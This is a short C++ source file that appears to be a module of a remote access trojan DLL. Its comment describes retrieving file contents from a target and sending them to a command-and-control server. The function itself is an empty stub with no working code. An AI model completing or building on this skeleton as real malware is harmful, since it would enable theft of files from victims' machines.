// Patrick Sacchet
// Verison 1.0.
// RAT-Dll-GetFile.cpp : Defines functionality for performing a file get on target, i.e., retrieving a buffer of file contents and sending it back to our C2 server

#include "RAT-Dll-GetFile.h"


INT performGetFile(__in const char* filePath, __out char* fileBytes)
{
	INT status = SUCCESS;
	
	// will get filesize and allocate this buffer ourselves 


cleanup:
	return status;
}